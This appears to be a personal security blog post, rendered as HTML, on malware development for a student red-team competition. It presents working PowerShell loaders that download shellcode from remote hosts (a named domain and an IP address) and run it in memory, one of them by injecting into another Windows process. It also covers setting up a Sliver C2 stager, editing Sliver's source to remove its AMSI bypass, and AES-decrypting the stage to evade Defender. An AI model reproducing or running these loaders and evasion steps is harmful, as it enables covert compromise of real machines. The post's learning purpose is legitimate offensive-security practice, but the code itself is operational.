@@ -1,0 +1,726 @@
+<!doctype html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>Evading Anti-Virus With Sliver C2 AES Encryption and Compression Process Injection - Malware Development #1 // indigo &lt;3</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.125.4">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Jonathan Skeete" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.8fa8794eaa080447f11069bd7790a70b4cb8e223063082eca1a345934219eadf.css" />
+    
+
+    
+  
+
+
+    <meta name="twitter:card" content="summary"><meta name="twitter:title" content="Evading Anti-Virus With Sliver C2 AES Encryption and Compression Process Injection - Malware Development #1">
+<meta name="twitter:description" content="Background This upcoming spring semester me and a few team members are competing in the Information Security Talent Search (ISTS) Competition hosted by the Rochester Institute of Technology. It is a three-day attack and defend competition, where teams compete in a King of the Hill style challenge by hacking and defending against other teams to keep their critical services such as HTTP, SMTP, and SNMP up for points.
+The competition rules strictly prohibit the use of any anti-virus applications, but as a red-teamer, that doesn&rsquo;t mean you start being noisy and dropping files to disk.">
+
+    <meta property="og:url" content="http://localhost:1313/posts/maldev/sliver-compression-and-encryption/">
+  <meta property="og:site_name" content="indigo &lt;3">
+  <meta property="og:title" content="Evading Anti-Virus With Sliver C2 AES Encryption and Compression Process Injection - Malware Development #1">
+  <meta property="og:description" content="Background This upcoming spring semester me and a few team members are competing in the Information Security Talent Search (ISTS) Competition hosted by the Rochester Institute of Technology. It is a three-day attack and defend competition, where teams compete in a King of the Hill style challenge by hacking and defending against other teams to keep their critical services such as HTTP, SMTP, and SNMP up for points.
+The competition rules strictly prohibit the use of any anti-virus applications, but as a red-teamer, that doesn’t mean you start being noisy and dropping files to disk.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-01-06T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-01-06T00:00:00+00:00">
+    <meta property="article:tag" content="Maldev">
+    <meta property="article:tag" content="Sliver">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="http://localhost:1313/"><img class="app-header-avatar" src="/avatar.jpg" alt="Jonathan Skeete" /></a>
+      <span class="app-header-title">indigo &lt;3</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>Penn State University Red Team Captain</p>
+      <div class="app-header-social">
+        
+          <a href="https://discord.com/users/xindigoo" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
+  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/jonathan-skeete-06b427256/" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Evading Anti-Virus With Sliver C2 AES Encryption and Compression Process Injection - Malware Development #1</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jan 6, 2025
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          24 min read
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="http://localhost:1313/tags/maldev/">Maldev</a>
+              <a class="tag" href="http://localhost:1313/tags/sliver/">Sliver</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="background">Background</h1>
+<p>This upcoming spring semester me and a few team members are competing in the Information Security Talent Search (ISTS) Competition hosted by the Rochester Institute of Technology. It is a three-day attack and defend competition, where teams compete in a King of the Hill style challenge by hacking and defending against other teams to keep their critical services such as HTTP, SMTP, and SNMP up for points.</p>
+<p>The competition rules strictly prohibit the use of any anti-virus applications, but as a red-teamer, that doesn&rsquo;t mean you start being noisy and dropping files to disk. At the end of the day, there&rsquo;s some poor blue-team log bunny on the other end of the terminal picking up on the signatures and heuristics you are creating, itching to boot you off their system.</p>
+<p>I didn&rsquo;t participate in ISTS last year, but the previous red-teamers left me a few scripts, one of which was a local process injection to gain a shell through a stage-listener provided by the C2 framework, sliver. (See source below) [Update: I have learned this script was created by Dominic Breuker in a <a href="https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/">blog post</a>]</p>
+<pre tabindex="0"><code>$Win32 = @&#34;
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+[DllImport(&#34;kernel32&#34;)]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress,
+    uint dwSize,
+    uint flAllocationType,
+    uint flProtect);
+[DllImport(&#34;kernel32&#34;, CharSet=CharSet.Ansi)]
+public static extern IntPtr CreateThread(
+    IntPtr lpThreadAttributes,
+    uint dwStackSize,
+    IntPtr lpStartAddress,
+    IntPtr lpParameter,
+    uint dwCreationFlags,
+    IntPtr lpThreadId);
+[DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
+public static extern UInt32 WaitForSingleObject(
+    IntPtr hHandle,
+    UInt32 dwMilliseconds);
+}
+&#34;@
+Add-Type $Win32
+
+$shellcode = (New-Object System.Net.WebCLient).DownloadData(&#34;http://login.magic-box.dev:8080/balls.woff&#34;)
+if ($shellcode -eq $null) {Exit};
+$size = $shellcode.Length
+
+[IntPtr]$addr = [Win32]::VirtualAlloc(0,$size,0x1000,0x40);
+[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)
+$thandle=[Win32]::CreateThread(0,0,$addr,0,0,0);
+[Win32]::WaitForSingleObject($thandle, [uint32]&#34;0xFFFFFFFF&#34;)
+</code></pre><p>For those reading in hopes of learning malware development, I will break down exactly how this works and what it is doing in the development section of this post, but first lets focus on how we can improve this.</p>
+<p>Please bear with me as this is my first malware development project ever. I actually consider myself a really bad coder, but due to that, whenever embarking on new development endeavors I try my best to break it down to the most barebones level, and hopefully, I can do that for you here today.</p>
+<h1 id="improvement">Improvement</h1>
+<p>At a very high level, this script downloads the shellcode, allocates the size of the shellcode to the memory space of the current processes, copies the shellcode to that memory space and executes it as a new thread of the current process.</p>
+<p>In theory, it works, and on a system without AV, or in this case, Windows Defender, you&rsquo;d get a session that you can interact with. However, in the spirit of being stealthy, this sucks&hellip; sorry Josh.</p>
+<p>Why does this suck you may ask? Well, let&rsquo;s say you use a tool such as Procmon to monitor the network traffic generated by your running processes, wouldn&rsquo;t it be suspicious to see a Powershell instance hanging and continuously generating network traffic? Sure, maybe anomalously a Powershell script will reach out to the internet to retrieve something, but continuous network traffic flowing from Powershell is indicative of C2.</p>
+<p><img src="local.gif" alt="local"></p>
+<p><em>Fig. 1: Powershell process suspiciously beaconing to C2</em></p>
+<p>It&rsquo;s also worth mentioning that in a real engagement, the second Windows Defender even sniffs that this script is anywhere even close to being executed, your process will be nuked from disk quicker than Japan after Pearl Harbor.</p>
+<p><img src="amsi.png" alt="amsi">
+<em>Fig. 2: Script signatured by defender</em></p>
+<p>When checking the script against the no-distribute malware scanner, Kleenscan, it was detected by 7/40 anti-virus engines. Against VirusTotal, 16/61. (Enter spiel about never uploading your malware samples to VirusTotal if they aren&rsquo;t getting flagged by AV, the quickest way to get burnt). But in this case, the sample was already getting flagged by defender, so I wanted to see under what signatures.</p>
+<p><img src="av2.png" alt="av2">
+<em>Fig 3: Original script against online malware scanners</em></p>
+<p>It&rsquo;s also worth mentioning that the shellcode being downloaded is massive. The conversation between the client and C2 amasses over 12,000 packets and 18 megabytes. In a situation where you may be monitored by EDR or SOC, your footprint would be huge and easily detected by rules that monitor for bulk downloads or X amount of packets in Y timeframe.</p>
+<p>The raw binary data also contains suspicious API function names and loaded dll&rsquo;s which will cause us to get flagged by defender once it reads the data.</p>
+<p><img src="uncompressed.png" alt="uncompressed">
+<em>Fig 4: Binary data analyzed by wireshark</em></p>
+<p>So, let&rsquo;s recap our issues, and make a list of things to implement in our new loader.</p>
+<ol>
+<li>Our implant does not blend into the baseline network traffic of a system (continuous network connections from Powershell).</li>
+<li>Both static and dynamic analysis of the script is heavily detected by AV engines.</li>
+<li>That binary is massive&hellip;</li>
+</ol>
+<h1 id="development">Development</h1>
+<h2 id="basic-remote-process-injection">Basic Remote Process Injection</h2>
+<p>Instead of injecting the shellcode into our current process which is likely to be Powershell or cmd, lets inject it into a process that normally and consistently processes network requests, think a web browser, service, etc.</p>
+<p>Let&rsquo;s go back to process monitor and adjust our filters to view all processes making network requests to find a good target.</p>
+<p><img src="baseline.png" alt="baseline"></p>
+<p><em>Fig 5: Benign processes that make network requests</em></p>
+<p>Looks like we have a few good targets. Now we have to figure out how we would inject instructions into the memory of one of these processes. Let&rsquo;s use the following diagram as a baseline for us to understand how this works.</p>
+<p><img src="PEProcess.png" alt="PEProcess.png"></p>
+<p><em>Fig 6: Process Injection Process</em></p>
+<p>In our first script, our workflow went like this:</p>
+<p>Allocate the size of the shellcode to the current process (Powershell) -&gt; Copy contents of shellcode to memory space -&gt; Execute it as another thread of the process</p>
+<p>We will change it to:</p>
+<p>Open the memory space of the process we want to inject into -&gt; Allocate the size of the shellcode to the remote process -&gt; Write the shellcode to the remote process -&gt; Create a remote thread</p>
+<p>This requires slightly different WinAPI calls than we used before. For our updated script, we will use OpenProcess, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread. Working with these API functions can be intimidating if you&rsquo;ve never done so, but when you read the Microsoft docs it&rsquo;s not that bad. I&rsquo;ll break down the parameters needed for the functions and how to implement them in the script.</p>
+<h3 id="openprocess">OpenProcess</h3>
+<p>The OpenProcess function is defined as such in the WinAPI docs.</p>
+<p><code>OpenProcess(DWORD dwDesiredAccess,BOOL bInheritHandle, DWORD dwProcessId );</code></p>
+<p>dwDesiredAccess - Essentially what access do we want to the process. The appropriate flag as defined in the docs for full rights is 0x001FFFFF, so we will use that.</p>
+<p>bInheritHandle - This a boolean statement that basically asks, do I want any possible child processes to access the contents of the process? To which the answer is no, this widens our footprint and subsequently the ability to get caught, therefore we set this to $false.</p>
+<p>dwProcessId - It&rsquo;s exactly what it sounds like, the process ID  which we want to open. The process ID won&rsquo;t be the same every time, so we&rsquo;ll pass this parameter a variable called ($processID) that stores the PID via a command executed at runtime to retrieve it.</p>
+<p>In that case, our script begins to look like this:</p>
+<pre tabindex="0"><code># Get the target process
+$targetProcess = Get-Process -Name cmd | Select-Object -First 1
+$processId = $targetProcess.Id
+
+# Open target process
+$process = [Win32]::OpenProcess(0x001FFFFF, $false, $processId)
+</code></pre><p>Not so bad right?! I thought the same, lets move on.</p>
+<h3 id="virtualallocex">VirtualAllocEx</h3>
+<p>Next we allocate memory to the process using VirtualAllocEx and the size of the shellcode like this.</p>
+<pre tabindex="0"><code>VirtualAllocEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect );
+</code></pre><p>hProcess - The process we opened and stored in $process</p>
+<p>lpAddress - Allows you to specify the starting address for the region of memory you want to allocate; however, passing a null value allows the system to choose on its own where to allocate it. In that case, we pass [System.IntPtr]::Zero which is the Powershell equivalent to NULL as inputting the number zero would be interpreted as an integer.</p>
+<p>dwSize - Size of the shellcode you are allocating, which we will have stored in value ($size)</p>
+<p>flAllocationType - Essentially asks what type of memory operation are you committing. In this case ,we will be reserving something in virtual memory, which is represented by the flag 0x2000, and committin g it to the physical memory, which is represented by the flag 0x1000. Since we are using two bitwise operators, we will combine them and pass the flag 0x3000.</p>
+<p>flProtect - Sets the permissions for the memory space. Similar to the filesystem you can specify read, write, or execute, or any combination of such. We will be reading, writing and executing from this memory space, represented by flag 0x40 in the WinAPI docs.</p>
+<p>This gives us:</p>
+<pre tabindex="0"><code>$memAddr = [Win32]::VirtualAllocEx($process, [System.IntPtr]::Zero, $size, 0x3000, 0x40)
+</code></pre><h3 id="writeprocessmemory">WriteProcessMemory</h3>
+<p>The WriteProcessMemory function copies data into the memory space we just allocated. Its definition in the WinAPI is:</p>
+<pre tabindex="0"><code>WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
+</code></pre><p>hProcess - Points to the process we opened and allocated memory to ($process)</p>
+<p>lpBaseAddress - The address where we want to write our data, which is the memory address we allocated ($memAddr)</p>
+<p>lpBuffer - This is the actual data we would want to write in the address space, which is the contents of the shellcode, which we&rsquo;ll have stored in ($shellcode)</p>
+<p>nSize - Size of the shellcode being written ($size)</p>
+<p>lpNumberOfBytesWritten - Optional parameter to store how many bytes were written; we can pass IntPtr.Zero since we don&rsquo;t need this, or we can create a variable called ($writtenBytes) initialized as 0 and reference it in the function to update the variable with the number of written bytes.</p>
+<pre tabindex="0"><code># Write the shellcode to allocated memory
+$writtenBytes = [System.UIntPtr]::Zero
+[Win32]::WriteProcessMemory($process, $memAddr, $shellcode, $size.ToUInt32(), [ref]$writtenBytes)
+</code></pre><h3 id="createremotethread">CreateRemoteThread</h3>
+<p>Finally, we create a thread in the target process to execute our shellcode. The CreateRemoteThread function is defined as:</p>
+<pre tabindex="0"><code>CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+</code></pre><p>hProcess - Our process we&rsquo;ve allocated and wrote shellcode to that we now want to execute as a remote thread ($process)</p>
+<p>lpThreadAttributes -Defines the security attributes for the thread. IntPtr.Zero initializes default settings.</p>
+<p>dwStackSize - Size of the stack for the new thread; 0 for default size</p>
+<p>lpStartAddress - Address where execution should begin, which is where we allocated them memory to ($memAddr)</p>
+<p>lpParameter - Additional parameters for the thread function; [System.IntPtr]::Zero since we don&rsquo;t need any.</p>
+<p>dwCreationFlags - The flags used to control thread creation. The flag 0 is used for immediate execution, so I&rsquo;ll use that.</p>
+<p>lpThreadId -  Optional parameter to store the thread ID; we can pass [System.IntPtr]::Zero since we don&rsquo;t need this, or we can create a variable called ($threadId) initialized as 0 and reference it in the function to update the variable with the executed threadID.</p>
+<pre tabindex="0"><code># Execute the shellcode
+$threadID = [System.IntPtr]::Zero
+[Win32]::CreateRemoteThread($process, [System.IntPtr]::Zero, 0, $memAddr, [System.IntPtr]::Zero, 0, [ref]$threadID)
+</code></pre><h2 id="new-process-injection-script">New Process Injection Script</h2>
+<p>Now that we analyzed and performed the steps necessary to perform process injection, we get to slap it all together. First, we must recognize that the functions I am using are C# functions and I am using them in Powershell, so I have to define a C# class which imports the necessary functions from the kernel32 DLL file. Additionally, I have to also actually download the shellcode from the sliver stage-listener and store that in a variable. After doing so, I final script looks like this.</p>
+<pre tabindex="0"><code>$Win32 = @&#34;
+using System;
+using System.Runtime.InteropServices;
+public class Win32 
+{
+    [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
+    public static extern IntPtr OpenProcess(uint DesiredAcess, bool bInheritHandle, int ProcessID);
+
+    [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
+    public static extern IntPtr VirtualAllocEx(IntPtr Process, IntPtr StartAddress, UIntPtr shellcodeSize, uint AllocationType, uint MemProtectConstraint);
+
+    [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
+    public static extern bool WriteProcessMemory(IntPtr Process, IntPtr StartAddr, byte[] Shellcode, uint  shellSize, out UIntPtr BytesWritten);
+
+    [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
+    public static extern IntPtr CreateRemoteThread(IntPtr Process, IntPtr threadAttrib, uint stackSize, IntPtr shellcodeAddr, IntPtr additonalParams, uint creationFlags, out IntPtr lpThreadId);
+
+}
+&#34;@
+Add-Type $Win32
+
+# Downlad shellcode from sliver C2 stage listener
+$shellcode = (New-Object System.Net.WebClient).DownloadData(&#34;http://104.38.66.28:80/balls.woff&#34;)
+if ($shellcode -eq $null) {Exit};
+$size = New-Object System.UIntPtr($shellcode.length)
+
+#retreive process id
+$svchostProcess = Get-Process -Name taskhostw | Select-Object -First 1
+$IdProcess = $svchostProcess.Id
+Write-Output &#34;Injected into process ID: $IdProcess&#34;
+
+#store process using openprocess and processid with full rights
+$process = [Win32]::OpenProcess(0x001FFFFF, $false, $IdProcess)	
+
+#Allocate size of shellcode to stored process memory
+$memAddr = [Win32]::VirtualAllocEx($process,[System.IntPtr]::Zero, $size, 0x00003000, 0x40)
+
+#Write shellcode to process memory
+$writtenBytes = [System.UIntPtr]::Zero
+[Win32]::WriteProcessMemory($process, $memAddr, $shellcode, $size.ToUInt32(), [ref]$writtenBytes)
+
+#runs the shellcode alongside process
+$threadID = [System.IntPtr]::Zero
+[Win32]::CreateRemoteThread($process, [System.IntPtr]::Zero, 0, $memAddr, [System.IntPtr]::Zero, 0, [ref]$threadID)
+</code></pre><h3 id="c2-provisioning">C2 Provisioning</h3>
+<p>Now that we have a piece of code which injects shellcode into a running process, we need to set up the stage-listener the loader retrieves its shellcode from.</p>
+<p>Begin by starting your Sliver server, <code>sudo systemctl start sliver</code>, and entering your Sliver client via <code>sliver</code>.</p>
+<p>Now we create a sliver &ldquo;profile&rdquo; which is essentially the configuration for the implant we&rsquo;ll serve through the stage-listener. Here, we&rsquo;ll create our profile to point back to our Kali VM as the C2 server, specify Windows as the operating system, and serve the implant as shellcode.</p>
+<pre tabindex="0"><code>All hackers gain indestructible
+[*] Server v1.5.39 - 31265c626b84cf70fd0832d653dc94efc6f40eb9 - Dirty
+[*] Welcome to the sliver shell, please type &#39;help&#39; for options
+
+sliver &gt; profiles new beacon -b 192.168.7.130 --os win -f shellcode meow
+</code></pre><p>Then we can generate an implant from our profile using <code>profiles generate &lt;profile name&gt;</code>, view the configuration of our implant by typing <code>implants</code>, and serve the stage listener using <code>implants stage</code>.</p>
+<pre tabindex="0"><code>sliver &gt; profiles generate meow
+
+[*] Generating new windows/amd64 beacon implant binary (1m0s)
+[*] Build completed in 7s
+[*] Implant saved to /home/kali/sliver/COMPLICATED_GYRO.bin
+
+sliver &gt; implants
+
+ Name                       Implant Type              Template   OS/Arch            Format   Command &amp; Control           Debug   C2 Config   ID      Stage 
+========================== ========================= ========== =============== =========== =========================== ======= =========== ======= =======
+COMPLICATED_GYRO           beacon                    sliver     windows/amd64   SHELLCODE   [1] https://192.168.7.130   true    default     55752   false 
+
+sliver &gt; implants stage
+
+? Select sessions and beacons to expose:  [Use arrows to move, space to select, &lt;right&gt; to all, &lt;left&gt; to none, type to filter]
+&gt; [x]  COMPLICATED_GYRO
+</code></pre><p>Sweet, now if we curl our IP address, provide any file name with the preconfigured stage-listener extension of <code>.woff</code>, and provide the <code>Template ID</code> as seen in our configuration when running <code> implants</code> as a URL parameter, we can see the endpoint provides us with a binary. However, simply visiting the IP address, a different extension, or another ID number, you are provided nothing.</p>
+<pre tabindex="0"><code>(kali㉿kali)-[~]
+└─$ curl http://192.168.7.130/pwned.woff?x=55752
+Warning: Binary output can mess up your terminal. Use &#34;--output -&#34; to tell curl to output it to your terminal anyway, or consider &#34;--output &lt;FILE&gt;&#34; to save 
+Warning: to a file.
+                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.7.130/pwned.woff?x=1    
+                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.7.130/pwned         
+                                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.7.130   
+</code></pre><p>The binary output from the endpoint we are sending a web request to in our script is the shellcode provided by the HTTP stage-listener. Let&rsquo;s run the script without defender enabled on our system and look at how our network signature changes in process monitor.</p>
+<h3 id="testing">Testing</h3>
+<p><img src="PE.gif" alt="PE"></p>
+<p><em>Fig 7: Successfully injecting into svchost</em></p>
+<p>As you can see, executing the script through Powershell allows us to get a sliver beacon which generates its network traffic through the svchost process, assimilating itself in what would be considered &ldquo;baseline&rdquo; process network activity on the system.</p>
+<p>Yeah, I guess it&rsquo;s a bit suspicious that Powershell still generates so much network traffic at once when downloading the shellcode, but at least it&rsquo;s less suspicious than leaving the Powershell process hanging and beaconing out to an unknown server.</p>
+<p>Also, let&rsquo;s say hypothetically, this entire process wasn&rsquo;t created in Powershell but instead, an executable framed as an installer for a legitimate piece of software&hellip; in that case the network traffic is almost expected and becomes a lot let suspicious. Combine that with a proper C2 deployment that includes obfuscation techniques such as redirectors and domain fronting then you&rsquo;re basically flying under the radar. We&rsquo;ll keep this in mind for another day.</p>
+<p><em>To be completely honest, for the sake of the competition, this is where the development of this tool was going to end for me considering AV was prohibited. However, I found myself trying to use the script in red team lab on the platform vulnlab, developed by XCT, which includes EDR Alerts and antivirus and could never get a shell due to being flagged by defender (You should 100% check out <a href="https://www.vulnlab.com/">vulnab</a> btw, great platform). At that moment this project became less about learning coding and a new payload delivery technique, but defeating antivirus altogether.</em></p>
+<h2 id="beating-defender">Beating Defender</h2>
+<p>In that case, lets take a look at the specific heuristic strings defender flags us on.</p>
+<p><img src="Defender.png" alt="Defender"></p>
+<p><em>Fig 8: Signatures defender flags our binary as</em></p>
+<p>For the sake of time and space, I&rsquo;ll quickly consolidate the two obstacles we must overcome.</p>
+<p>If you take a look at <a href="https://github.com/BishopFox/sliver/blob/master/server/generate/donut.go">sliver&rsquo;s source code</a>, they use <a href="https://github.com/TheWover/donut">donut</a>, a position-independent code generator and loader designed to facilitate the in-memory execution of various file format, to implement AMSI bypass into their generated binaries. The AMSI bypass is heavily signatured by AV engines, so once loaded into the process and executed, the injected process gets killed by defender.</p>
+<p>Ignoring the AMSI bypass, we also run into the issue of reverse shells themself being signatured by defender. Therefore, once the shellcode is downloaded and interpreted, it&rsquo;d be recognized as a reverse shell, and again killed by defender.</p>
+<p>How do we beat this?</p>
+<ol>
+<li>Encrypt our stager and decode it at runtime so any PE data cannot be read by defender or AMSI. (This also solves the issue of binary data being readable over the wire as seen in Fig. 4)</li>
+<li>Change the sliver source code so it doesn&rsquo;t generate shellcode with AMSI bypass</li>
+</ol>
+<p>Back to the drawing board we go.</p>
+<h3 id="modifying-and-building-sliver-from-source">Modifying and Building Sliver From Source.</h3>
+<p>To disable AMSI Bypass whenever generating the stager, we must do the following:</p>
+<ol>
+<li>Download sliver repository `git clone <a href="https://github.com/bishopfox/sliver'">https://github.com/bishopfox/sliver'</a></li>
+<li>Enter the local repository, and modify the donut config
+<ol>
+<li><code>cd sliver</code></li>
+<li><code>sudo nano server/generate/donut.go</code></li>
+</ol>
+</li>
+<li>Change the bypass value in the donut config from 3 to 1</li>
+</ol>
+<pre tabindex="0"><code>	config := donut.DonutConfig
+	{
+		Type:       getDonutType(ext, false),
+		InstType:   donut.DONUT_INSTANCE_PIC,
+		Parameters: params,
+		Class:      className,
+		Method:     method,
+		Bypass:     3 -&gt; 1,  // 1=skip, 2=abort on fail, 3=continue on fail.
+		Format:     uint32(1), // 1=raw, 2=base64, 3=c, 4=ruby, 5=python 
+	...
+</code></pre><ol start="4">
+<li>Save the config and compile the client and server binaries using <code>make</code></li>
+</ol>
+<p>Now, when sliver generates its binaries, it will not include AMSI bypass.</p>
+<h3 id="applying-aes-encryption">Applying AES Encryption</h3>
+<p>Now let&rsquo;s take a look at the settings I can apply to stager in sliver by running <code>profiles stage</code></p>
+<pre tabindex="0"><code>sliver &gt; profiles stage
+
+Error: accepts 1 arg(s), received 0
+Usage:
+   profiles stage [flags]
+
+Flags:
+  -i, --aes-encrypt-iv string    AES Encryption IV
+  -k, --aes-encrypt-key string   AES Encryption Key
+  -c, --compress string          Compress stage (zlib, gzip, deflate9 or deflate)
+  -h, --help                     help for stage
+  -n, --name string              Implant name
+  -p, --prepend-size             Prepend stage size
+  -r, --rc4-encrypt-key string   RC4 encryption key
+  -s, --save string              directory/file to the binary to
+
+Global Flags:
+  -t, --timeout int   grpc timeout in seconds (default 60)
+</code></pre><p>Here, we&rsquo;re mostly interested in <code>--aes-encrypt--key</code> and <code>--aes-encrypt-iv</code>. When trying to supply my own AES Key/IV pair, sliver gave me an error. I&rsquo;m not entirely sure why, but this is currently being tracked in GitHub issue <a href="https://github.com/BishopFox/sliver/issues/1848">#1848</a>. Nonetheless, providing <code>--aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&amp;E)H@McQfT</code> and <code>--aes-encrypt-iv 8y/B?E(G+KbPeShV</code> as seen in the <a href="https://github.com/BishopFox/sliver/wiki/Stagers/e2b8417c1434c926daf746f9e85146566972a69e">sliver docs</a> works.</p>
+<p>Since the binary we&rsquo;re receiving from the stage-listener is encrypted, our script will have to include a decrypt functionality.  Thankfully sliver documentation also includes a prewritten C# AES decryption function (see below).</p>
+<pre tabindex="0"><code>private static byte[] Decrypt(byte[] ciphertext, string AESKey, string AESIV)
+
+        {
+            byte[] key = Encoding.UTF8.GetBytes(AESKey);
+            byte[] IV = Encoding.UTF8.GetBytes(AESIV);
+            using (Aes aesAlg = Aes.Create())
+            {
+                aesAlg.Key = key;
+                aesAlg.IV = IV;
+                aesAlg.Padding = PaddingMode.None;
+                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key,                    aesAlg.IV);
+                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
+                {
+                    using (CryptoStream cryptoStream = new                                             CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
+                    {
+                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
+                        return memoryStream.ToArray();
+                    }
+                }
+            }
+        }
+</code></pre><p>At a high level, this function decrypts the ciphertext using the AES encryption algorithm by using the AES key and IV provided to configure an AES decryptor. The ciphertext is processed through a CryptoStream, decrypted in-memory, and returned as a byte array. Creating something similar in powershell gets me this:</p>
+<pre tabindex="0"><code>function Decrypt 
+{
+    param ([byte[]]$FullData)
+
+    $key =                                                                             [System.Text.Encoding]::UTF8.GetBytes(&#39;D(G+KbPeShVmYq3t6v9y$B&amp;E)H@McQfT&#39;)
+    $iv = [System.Text.Encoding]::UTF8.GetBytes(&#39;8y/B?E(G+KbPeShV&#39;)
+    $cipherText = $FullData[16..($FullData.Length - 1)]
+
+    $aesAlg = [System.Security.Cryptography.Aes]::Create()
+    $decryptor = $null
+    $memoryStream = $null
+    $cryptoStream = $null
+
+    try 
+    {
+        $aesAlg.Key = $key
+        $aesAlg.IV = $iv
+        $aesAlg.Padding = [System.Security.Cryptography.PaddingMode]::None
+        $aesAlg.Mode = [System.Security.Cryptography.CipherMode]::CBC
+
+        $decryptor = $aesAlg.CreateDecryptor()
+        $memoryStream = [System.IO.MemoryStream]::new()
+        $cryptoStream = 
+        [System.Security.Cryptography.CryptoStream]::new($memoryStream,
+        $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
+
+        $cryptoStream.Write($cipherText, 0, $cipherText.Length)
+        $cryptoStream.FlushFinalBlock()
+
+        $result = $memoryStream.ToArray()
+        return $result
+    }
+    catch 
+    {
+        Write-Error &#34;Decryption failed&#34;
+    }
+    finally 
+    {
+        if ($cryptoStream) { $cryptoStream.Dispose() }
+        if ($memoryStream) { $memoryStream.Dispose() }
+        if ($decryptor) { $decryptor.Dispose() }
+        if ($aesAlg) { $aesAlg.Dispose() }
+    }
+}
+</code></pre><p>I had implemented the AES decrypt functionality before I recompiled Sliver from the source to change the donut configuration. So after making the changes and recompiling I felt on top of the world, and finally ready to beat defender&hellip; but alas, that did not happen.</p>
+<p>It turns out the version of the Sliver I downloaded was released 4 days ago, and documentation had not yet been updated, so when downloaded my &ldquo;encrypted stage&rdquo;, its content were seemingly empty&hellip; great.</p>
+<p><img src="error.png" alt="error"></p>
+<p><em>Fig 9: Empty binary after only AES encrypting</em></p>
+<p>After bashing my head at a wall, I decided to open a <a href="https://github.com/BishopFox/sliver/issues/1842">GitHub issue</a> where I was informed this was expected functionality from the new version and I would have to encode/compress the stager or else it would interfere with the HTTP response, great.</p>
+<p>Although I did not intend to add decompression capabilities to this tool, it does drastically reduce the size of the binary over the wire, and it gives me experience with more obfuscation methods, so I guess it&rsquo;s a win-win.</p>
